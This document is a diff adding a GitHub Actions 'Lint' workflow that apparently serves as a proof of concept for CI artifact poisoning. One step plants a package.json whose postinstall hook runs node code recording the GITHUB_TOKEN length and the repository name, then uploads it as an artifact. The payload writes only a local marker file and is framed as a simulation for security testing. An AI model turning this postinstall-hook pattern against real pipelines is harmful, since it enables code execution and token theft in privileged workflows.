@@ -1,0 +1,42 @@
+name: Lint
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Save PR number
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: echo "$PR_NUMBER" > pr-number.txt
+
+      - name: Simulate attacker-controlled artifact payload
+        run: |
+          cat > package.json <<'JSON'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": {
+              "postinstall": "node -e \"const fs=require('fs');fs.writeFileSync('pwned.txt','RCE in privileged workflow\\n'+ 'token_len='+(process.env.GITHUB_TOKEN||'').length + '\\n' + 'repo='+process.env.GITHUB_REPOSITORY+'\\n')\""
+            }
+          }
+          JSON
+          printf 'fake linter output\n' > linter-report.txt
+          ls -la
+
+      - name: Upload linter report
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: |
+            linter-report.txt
+            pr-number.txt
+            package.json
+          if-no-files-found: ignore
